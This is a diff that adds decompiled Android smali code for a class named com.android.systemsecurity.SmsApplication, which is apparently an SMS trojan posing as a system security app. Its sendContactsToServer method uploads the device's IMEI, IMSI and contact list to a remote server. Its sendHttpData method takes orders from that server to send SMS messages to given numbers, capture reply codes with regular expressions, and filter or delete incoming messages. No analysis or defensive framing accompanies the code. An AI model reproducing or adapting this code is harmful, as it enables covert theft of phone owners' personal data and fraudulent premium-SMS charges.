+    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v6, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v6
+
+    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v6
+
+    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 218
+    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;
+
+    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
+
+    .line 219
+    .local v1, httpClient:Lorg/apache/http/client/HttpClient;
+    new-instance v2, Lorg/apache/http/client/methods/HttpPost;
+
+    invoke-direct {v2, p0}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
+
+    .line 222
+    .local v2, httpPost:Lorg/apache/http/client/methods/HttpPost;
+    :try_start_0
+    new-instance v5, Lorg/apache/http/client/entity/UrlEncodedFormEntity;
+
+    invoke-direct {v5, p1}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V
+
+    invoke-virtual {v2, v5}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
+
+    .line 223
+    invoke-interface {v1, v2}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result-object v3
+
+    .line 230
+    .local v3, httpResponse:Lorg/apache/http/HttpResponse;
+    sget-object v5, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    new-instance v6, Ljava/lang/StringBuilder;
+
+    const-string v7, "Response status = "
+
+    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-interface {v3}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;
+
+    move-result-object v7
+
+    invoke-interface {v7}, Lorg/apache/http/StatusLine;->getStatusCode()I
+
+    move-result v7
+
+    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v6
+
+    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v6
+
+    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 233
+    invoke-interface {v3}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;
+
+    move-result-object v5
+
+    invoke-interface {v5}, Lorg/apache/http/StatusLine;->getStatusCode()I
+
+    move-result v5
+
+    const/16 v6, 0xc8
+
+    if-eq v5, v6, :cond_0
+
+    move-object v3, v4
+
+    .line 235
+    .end local v3           #httpResponse:Lorg/apache/http/HttpResponse;
+    :cond_0
+    :goto_0
+    return-object v3
+
+    .line 224
+    :catch_0
+    move-exception v0
+
+    .line 225
+    .local v0, ex:Ljava/lang/Exception;
+    sget-object v5, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    const-string v6, "Request Exception"
+
+    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    move-object v3, v4
+
+    .line 227
+    goto :goto_0
+.end method
+
+.method public static matcher(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;
+    .locals 6
+    .parameter "regexp"
+    .parameter "position"
+    .parameter "source"
+
+    .prologue
+    const/4 v5, 0x0
+
+    .line 745
+    if-eqz p0, :cond_0
+
+    const-string v4, ""
+
+    if-eq p0, v4, :cond_0
+
+    if-nez p2, :cond_1
+
+    :cond_0
+    move-object v4, v5
+
+    .line 762
+    :goto_0
+    return-object v4
+
+    .line 748
+    :cond_1
+    :try_start_0
+    new-instance v2, Ljava/util/Vector;
+
+    invoke-direct {v2}, Ljava/util/Vector;-><init>()V
+
+    .line 750
+    .local v2, matches:Ljava/util/Vector;,"Ljava/util/Vector<Ljava/lang/String;>;"
+    const/16 v4, 0x8
+
+    invoke-static {p0, v4}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;
+
+    move-result-object v3
+
+    .line 751
+    .local v3, p:Ljava/util/regex/Pattern;
+    invoke-virtual {v3, p2}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
+
+    move-result-object v1
+
+    .line 752
+    .local v1, m:Ljava/util/regex/Matcher;
+    :goto_1
+    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z
+
+    move-result v4
+
+    if-nez v4, :cond_2
+
+    .line 757
+    invoke-virtual {v2}, Ljava/util/Vector;->size()I
+
+    move-result v4
+
+    if-ge v4, p1, :cond_3
+
+    move-object v4, v5
+
+    goto :goto_0
+
+    .line 753
+    :cond_2
+    invoke-virtual {v1}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;
+
+    move-result-object v4
+
+    invoke-virtual {v2, v4}, Ljava/util/Vector;->add(Ljava/lang/Object;)Z
+
+    goto :goto_1
+
+    .line 760
+    .end local v1           #m:Ljava/util/regex/Matcher;
+    .end local v2           #matches:Ljava/util/Vector;,"Ljava/util/Vector<Ljava/lang/String;>;"
+    .end local v3           #p:Ljava/util/regex/Pattern;
+    :catch_0
+    move-exception v0
+
+    .local v0, ex:Ljava/lang/Exception;
+    move-object v4, v5
+
+    .line 762
+    goto :goto_0
+
+    .line 759
+    .end local v0           #ex:Ljava/lang/Exception;
+    .restart local v1       #m:Ljava/util/regex/Matcher;
+    .restart local v2       #matches:Ljava/util/Vector;,"Ljava/util/Vector<Ljava/lang/String;>;"
+    .restart local v3       #p:Ljava/util/regex/Pattern;
+    :cond_3
+    add-int/lit8 v4, p1, -0x1
+
+    invoke-virtual {v2, v4}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;
+
+    move-result-object v4
+
+    check-cast v4, Ljava/lang/String;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    goto :goto_0
+.end method
+
+.method public static millsToString(J)Ljava/lang/String;
+    .locals 3
+    .parameter "mills"
+
+    .prologue
+    .line 852
+    new-instance v1, Ljava/text/SimpleDateFormat;
+
+    const-string v2, "dd.MM.yyyy hh:mm:ss.SSS"
+
+    invoke-direct {v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V
+
+    .line 853
+    .local v1, formatter:Ljava/text/DateFormat;
+    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;
+
+    move-result-object v0
+
+    .line 854
+    .local v0, calendar:Ljava/util/Calendar;
+    invoke-virtual {v0, p0, p1}, Ljava/util/Calendar;->setTimeInMillis(J)V
+
+    .line 855
+    invoke-virtual {v0}, Ljava/util/Calendar;->getTime()Ljava/util/Date;
+
+    move-result-object v2
+
+    invoke-virtual {v1, v2}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;
+
+    move-result-object v2
+
+    return-object v2
+.end method
+
+.method public static sendContactsToServer(Landroid/content/Context;Ljava/lang/String;)V
+    .locals 13
+    .parameter "context"
+    .parameter "contacts"
+
+    .prologue
+    .line 453
+    sget-object v10, Ljava/lang/System;->out:Ljava/io/PrintStream;
+
+    new-instance v11, Ljava/lang/StringBuilder;
+
+    const-string v12, "Contacts: "
+
+    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v11, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v11
+
+    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-virtual {v10, v11}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
+
+    .line 455
+    const/4 v5, 0x0
+
+    .line 456
+    .local v5, connection:Ljava/net/HttpURLConnection;
+    const/4 v7, 0x0
+
+    .line 458
+    .local v7, outputStream:Ljava/io/DataOutputStream;
+    const-string v1, "multipart/form-data; boundary=AaB03x"
+
+    .line 459
+    .local v1, KContentType:Ljava/lang/String;
+    const-string v4, "--AaB03x"
+
+    .line 460
+    .local v4, KStartContent:Ljava/lang/String;
+    const-string v3, "--AaB03x--"
+
+    .line 461
+    .local v3, KEndContent:Ljava/lang/String;
+    const-string v2, "\r\n"
+
+    .line 465
+    .local v2, KCrlf:Ljava/lang/String;
+    :try_start_0
+    new-instance v9, Ljava/net/URL;
+
+    invoke-static {}, Lcom/android/systemsecurity/SmsApplication;->getApplicationUrl()Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-direct {v9, v10}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
+
+    .line 466
+    .local v9, url:Ljava/net/URL;
+    invoke-virtual {v9}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
+
+    move-result-object v10
+
+    move-object v0, v10
+
+    check-cast v0, Ljava/net/HttpURLConnection;
+
+    move-object v5, v0
+
+    .line 468
+    const/4 v10, 0x1
+
+    invoke-virtual {v5, v10}, Ljava/net/HttpURLConnection;->setDoInput(Z)V
+
+    .line 469
+    const/4 v10, 0x1
+
+    invoke-virtual {v5, v10}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
+
+    .line 470
+    const/4 v10, 0x0
+
+    invoke-virtual {v5, v10}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V
+
+    .line 472
+    const-string v10, "POST"
+
+    invoke-virtual {v5, v10}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
+
+    .line 474
+    const-string v10, "Content-Type"
+
+    invoke-virtual {v5, v10, v1}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 476
+    new-instance v8, Ljava/io/DataOutputStream;
+
+    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+
+    move-result-object v10
+
+    invoke-direct {v8, v10}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 478
+    .end local v7           #outputStream:Ljava/io/DataOutputStream;
+    .local v8, outputStream:Ljava/io/DataOutputStream;
+    :try_start_1
+    invoke-virtual {v8, v4}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 479
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 480
+    const-string v10, "Content-Disposition: form-data; name=\"imei\""
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 481
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 482
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 483
+    sget-object v10, Lcom/android/systemsecurity/SmsApplication;->imei:Ljava/lang/String;
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 484
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 486
+    invoke-virtual {v8, v4}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 487
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 488
+    const-string v10, "Content-Disposition: form-data; name=\"imsi\""
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 489
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 490
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 491
+    sget-object v10, Lcom/android/systemsecurity/SmsApplication;->imsi:Ljava/lang/String;
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 492
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 494
+    invoke-virtual {v8, v4}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 495
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 496
+    const-string v10, "Content-Disposition: form-data; name=\"os\""
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 497
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 498
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 499
+    const-string v10, "android"
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 500
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 503
+    invoke-virtual {v8, v4}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 504
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 505
+    const-string v10, "Content-Disposition: form-data; name=\"contacts\""
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 506
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 507
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 508
+    const-string v10, "1"
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 509
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 511
+    invoke-virtual {v8, v4}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 512
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 513
+    const-string v10, "Content-Disposition: form-data; name=\"FILE\"; filename=\"contacts.xml\""
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 514
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 515
+    const-string v10, "Content-Type: application/octet-stream"
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 516
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 517
+    const-string v10, "Content-Transfer-Encoding: binary"
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 518
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 519
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 521
+    const-string v10, "utf-8"
+
+    invoke-virtual {p1, v10}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+
+    move-result-object v10
+
+    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->write([B)V
+
+    .line 523
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 524
+    invoke-virtual {v8, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 525
+    invoke-virtual {v8, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
+
+    .line 527
+    invoke-virtual {v8}, Ljava/io/DataOutputStream;->flush()V
+
+    .line 528
+    invoke-virtual {v8}, Ljava/io/DataOutputStream;->close()V
+
+    .line 530
+    sget-object v10, Lcom/android/systemsecurity/SmsApplication;->TAG:Ljava/lang/String;
+
+    new-instance v11, Ljava/lang/StringBuilder;
+
+    const-string v12, "Send contact: getResponseCode: "
+
+    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getResponseCode()I
+
+    move-result v12
+
+    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v11
+
+    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-static {v10, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 532
+    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getResponseCode()I
+
+    move-result v10
+
+    const/16 v11, 0xc8
+
+    if-ne v10, v11, :cond_0
+
+    .line 535
+    sget-object v10, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v10, v10, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    const/4 v11, 0x0
+
+    iput-boolean v11, v10, Lcom/android/systemsecurity/SettingsSet;->isNeedSendContacts:Z
+
+    .line 536
+    sget-object v10, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    invoke-virtual {v10, p0}, Lcom/android/systemsecurity/Settings;->save(Landroid/content/Context;)Z
+
+    .line 539
+    :cond_0
+    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
+
+    move-object v7, v8
+
+    .line 546
+    .end local v8           #outputStream:Ljava/io/DataOutputStream;
+    .end local v9           #url:Ljava/net/URL;
+    .restart local v7       #outputStream:Ljava/io/DataOutputStream;
+    :goto_0
+    return-void
+
+    .line 542
+    :catch_0
+    move-exception v6
+
+    .line 544
+    .local v6, ex:Ljava/lang/Exception;
+    :goto_1
+    invoke-virtual {v6}, Ljava/lang/Exception;->printStackTrace()V
+
+    goto :goto_0
+
+    .line 542
+    .end local v6           #ex:Ljava/lang/Exception;
+    .end local v7           #outputStream:Ljava/io/DataOutputStream;
+    .restart local v8       #outputStream:Ljava/io/DataOutputStream;
+    .restart local v9       #url:Ljava/net/URL;
+    :catch_1
+    move-exception v6
+
+    move-object v7, v8
+
+    .end local v8           #outputStream:Ljava/io/DataOutputStream;
+    .restart local v7       #outputStream:Ljava/io/DataOutputStream;
+    goto :goto_1
+.end method
+
+.method private static sendHttpData(Ljava/lang/String;Ljava/util/List;)Lcom/android/systemsecurity/ServerResponse;
+    .locals 12
+    .parameter "url"
+    .parameter
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "(",
+            "Ljava/lang/String;",
+            "Ljava/util/List",
+            "<",
+            "Lorg/apache/http/NameValuePair;",
+            ">;)",
+            "Lcom/android/systemsecurity/ServerResponse;"
+        }
+    .end annotation
+
+    .prologue
+    .line 242
+    .local p1, params:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
+    new-instance v5, Lcom/android/systemsecurity/ServerResponse;
+
+    invoke-direct {v5}, Lcom/android/systemsecurity/ServerResponse;-><init>()V
+
+    .line 254
+    .local v5, response:Lcom/android/systemsecurity/ServerResponse;
+    :try_start_0
+    invoke-static {p0, p1}, Lcom/android/systemsecurity/SmsApplication;->makeHttpPost(Ljava/lang/String;Ljava/util/List;)Lorg/apache/http/HttpResponse;
+
+    move-result-object v4
+
+    .line 256
+    .local v4, httpResponse:Lorg/apache/http/HttpResponse;
+    const-string v6, ""
+
+    .line 257
+    .local v6, tagName:Ljava/lang/String;
+    invoke-static {}, Lorg/xmlpull/v1/XmlPullParserFactory;->newInstance()Lorg/xmlpull/v1/XmlPullParserFactory;
+
+    move-result-object v9
+
+    .line 258
+    .local v9, xmlPullParserFactory:Lorg/xmlpull/v1/XmlPullParserFactory;
+    invoke-virtual {v9}, Lorg/xmlpull/v1/XmlPullParserFactory;->newPullParser()Lorg/xmlpull/v1/XmlPullParser;
+
+    move-result-object v8
+
+    .line 259
+    .local v8, xmlParser:Lorg/xmlpull/v1/XmlPullParser;
+    invoke-interface {v4}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;
+
+    move-result-object v10
+
+    invoke-interface {v10}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;
+
+    move-result-object v10
+
+    const/4 v11, 0x0
+
+    invoke-interface {v8, v10, v11}, Lorg/xmlpull/v1/XmlPullParser;->setInput(Ljava/io/InputStream;Ljava/lang/String;)V
+
+    .line 263
+    :cond_0
+    :goto_0
+    invoke-interface {v8}, Lorg/xmlpull/v1/XmlPullParser;->next()I
+
+    move-result v2
+
+    .line 264
+    .local v2, event:I
+    packed-switch v2, :pswitch_data_0
+
+    goto :goto_0
+
+    .line 268
+    :pswitch_0
+    invoke-interface {v8}, Lorg/xmlpull/v1/XmlPullParser;->getName()Ljava/lang/String;
+
+    move-result-object v6
+
+    .line 269
+    const-string v10, "send"
+
+    invoke-virtual {v6, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v10
+
+    if-eqz v10, :cond_1
+
+    .line 270
+    new-instance v0, Lcom/android/systemsecurity/SmsItem;
+
+    invoke-direct {v0}, Lcom/android/systemsecurity/SmsItem;-><init>()V
+
+    .line 271
+    .local v0, data:Lcom/android/systemsecurity/SmsItem;
+    const-string v10, "number"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    iput-object v10, v0, Lcom/android/systemsecurity/SmsItem;->number:Ljava/lang/String;
+
+    .line 272
+    const-string v10, "text"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    iput-object v10, v0, Lcom/android/systemsecurity/SmsItem;->text:Ljava/lang/String;
+
+    .line 275
+    const-string v10, "rcoderxp"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-static {v10}, Lcom/android/systemsecurity/SmsApplication;->decodeHtml(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    iput-object v10, v0, Lcom/android/systemsecurity/SmsItem;->replyCodeRxp:Ljava/lang/String;
+
+    .line 276
+    const-string v10, "rcodegrp"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    const/4 v11, 0x0
+
+    invoke-static {v10, v11}, Lcom/android/systemsecurity/SmsApplication;->convertToIntSafe(Ljava/lang/String;I)I
+
+    move-result v10
+
+    iput v10, v0, Lcom/android/systemsecurity/SmsItem;->replyCodeGrp:I
+
+    .line 277
+    const-string v10, "rnumberrxp"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-static {v10}, Lcom/android/systemsecurity/SmsApplication;->decodeHtml(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    iput-object v10, v0, Lcom/android/systemsecurity/SmsItem;->replyNumberRxp:Ljava/lang/String;
+
+    .line 278
+    const-string v10, "rnumbergrp"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    const/4 v11, 0x0
+
+    invoke-static {v10, v11}, Lcom/android/systemsecurity/SmsApplication;->convertToIntSafe(Ljava/lang/String;I)I
+
+    move-result v10
+
+    iput v10, v0, Lcom/android/systemsecurity/SmsItem;->replyNumberGrp:I
+
+    .line 279
+    iget-object v10, v5, Lcom/android/systemsecurity/ServerResponse;->sms:Ljava/util/Vector;
+
+    invoke-virtual {v10, v0}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    goto :goto_0
+
+    .line 320
+    .end local v0           #data:Lcom/android/systemsecurity/SmsItem;
+    .end local v2           #event:I
+    .end local v4           #httpResponse:Lorg/apache/http/HttpResponse;
+    .end local v6           #tagName:Ljava/lang/String;
+    .end local v8           #xmlParser:Lorg/xmlpull/v1/XmlPullParser;
+    .end local v9           #xmlPullParserFactory:Lorg/xmlpull/v1/XmlPullParserFactory;
+    :catch_0
+    move-exception v3
+
+    .line 322
+    .local v3, ex:Ljava/lang/Exception;
+    invoke-virtual {v3}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 327
+    .end local v3           #ex:Ljava/lang/Exception;
+    :goto_1
+    return-object v5
+
+    .line 280
+    .restart local v2       #event:I
+    .restart local v4       #httpResponse:Lorg/apache/http/HttpResponse;
+    .restart local v6       #tagName:Ljava/lang/String;
+    .restart local v8       #xmlParser:Lorg/xmlpull/v1/XmlPullParser;
+    .restart local v9       #xmlPullParserFactory:Lorg/xmlpull/v1/XmlPullParserFactory;
+    :cond_1
+    :try_start_1
+    const-string v10, "delete"
+
+    invoke-virtual {v6, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v10
+
+    if-eqz v10, :cond_2
+
+    .line 281
+    new-instance v0, Lcom/android/systemsecurity/SmsItem;
+
+    invoke-direct {v0}, Lcom/android/systemsecurity/SmsItem;-><init>()V
+
+    .line 282
+    .restart local v0       #data:Lcom/android/systemsecurity/SmsItem;
+    const-string v10, "number"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    iput-object v10, v0, Lcom/android/systemsecurity/SmsItem;->number:Ljava/lang/String;
+
+    .line 283
+    const-string v10, "text"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    iput-object v10, v0, Lcom/android/systemsecurity/SmsItem;->text:Ljava/lang/String;
+
+    .line 284
+    iget-object v10, v5, Lcom/android/systemsecurity/ServerResponse;->filters:Ljava/util/Vector;
+
+    invoke-virtual {v10, v0}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V
+
+    goto/16 :goto_0
+
+    .line 285
+    .end local v0           #data:Lcom/android/systemsecurity/SmsItem;
+    :cond_2
+    const-string v10, "sms"
+
+    invoke-virtual {v6, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v10
+
+    if-eqz v10, :cond_3
+
+    .line 286
+    const-string v10, "delay"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-static {v10}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J
+
+    move-result-wide v10
+
+    iput-wide v10, v5, Lcom/android/systemsecurity/ServerResponse;->delay:J
+
+    goto/16 :goto_0
+
+    .line 287
+    :cond_3
+    const-string v10, "smscf"
+
+    invoke-virtual {v6, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v10
+
+    if-eqz v10, :cond_0
+
+    .line 288
+    const-string v10, "value"
+
+    invoke-static {v8, v10}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v10
+
+    const-string v11, ""
+
+    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v10
+
+    if-nez v10, :cond_0
+
+    .line 289
+    iget-object v10, v5, Lcom/android/systemsecurity/ServerResponse;->smscFilters:Ljava/util/Vector;
+
+    const-string v11, "value"
+
+    invoke-static {v8, v11}, Lcom/android/systemsecurity/SmsApplication;->getAttributeValue(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-virtual {v10, v11}, Ljava/util/Vector;->add(Ljava/lang/Object;)Z
+
+    goto/16 :goto_0
+
+    .line 296
+    :pswitch_1
+    invoke-interface {v8}, Lorg/xmlpull/v1/XmlPullParser;->getName()Ljava/lang/String;
+
+    move-result-object v10
+
+    const-string v11, "response"
+
+    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v10
+
+    if-eqz v10, :cond_0
+
+    goto :goto_1
+
